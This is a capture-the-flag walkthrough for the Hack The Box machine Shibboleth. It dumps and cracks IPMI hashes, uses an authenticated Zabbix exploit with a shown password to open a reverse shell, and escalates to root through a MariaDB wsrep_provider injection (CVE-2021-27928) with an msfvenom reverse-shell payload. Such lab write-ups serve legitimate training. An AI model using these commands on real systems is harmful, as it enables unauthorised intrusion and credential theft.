## Shibboleth

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.11.124 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/a0c0fbef-5f9f-48c0-b6ad-8c179dfcbc4e)

<br>

On website we can see in the footer some information. This indicate to us that Zabbix and something related to BMC are being used.

![websiteInformation](https://github.com/b1d0ws/OSCP/assets/58514930/e4ce10b3-9716-4dd3-b957-d9f0c60b3786)

<br>

We can enumerate IPMI doing UDP scan with nmap.

```
sudo nmap -sU 10.10.11.124 -T4 --top-ports=100
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/f7bb231d-1eec-4e00-aafd-6601991b1d1b)

<br>

Searching for IPMI exploit, [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi) show a metasploit module that can be used to dump hashes.  

We can crack this hash with hashcat and find a password.

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

![dumpHashes](https://github.com/b1d0ws/OSCP/assets/58514930/a3a8e681-d898-4048-9d1a-bdf7f0aab613)

![crackingHash](https://github.com/b1d0ws/OSCP/assets/58514930/5a5f7f32-d68b-4ea3-bfcf-d7e73eb5af65)

<br>

To find Zabbix, we can enumerate subdomains with wfuzz.

```
wfuzz -H 'Host: FUZZ.shibboleth.htb' -u http://shibboleth.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
```

![wfuzz](https://github.com/b1d0ws/OSCP/assets/58514930/08f78443-b3bd-44b9-b01b-a17bb61ef0d5)

![zabbixPanel](https://github.com/b1d0ws/OSCP/assets/58514930/8e1c48e6-018b-4611-b7ae-0d511231f09c)

<br>

Log into zabbix with the credentials got before and use this [exploit](https://www.exploit-db.com/exploits/50816) to get a reverse shell.

```
python3 50816.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.11 1337
```

![gettingShell](https://github.com/b1d0ws/OSCP/assets/58514930/de14a407-41d2-472d-bff2-cebb8e143c7a)

Now you can use the first password to login as ipmi-svc user.

### Root Flag

LinPeas return to us zabbix credentials that can be used to login in MySQL.  

Connecting to it, we enumerate the version of MariaDB.

![zabbixConfig](https://github.com/b1d0ws/OSCP/assets/58514930/3eeb3cb6-8cd3-4b39-9c48-454b8f962a82)

![mysqlVersion](https://github.com/b1d0ws/OSCP/assets/58514930/244a4760-014c-4d06-b620-f6d428ead0c2)

<br>

Searching for exploit of this database, this [github](https://github.com/Al1ex/CVE-2021-27928) show how to perform command injection on it.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=3333 -f elf-so -o CVE-2021-27928.so

mysql -u zabbix -p
SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
```

![searchingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/3563b3bd-6d76-406d-b357-05f69a61000e)

![rootPrivilegeEscalation](https://github.com/b1d0ws/OSCP/assets/58514930/f3631126-9e30-4694-82fe-9b48d61c321e)
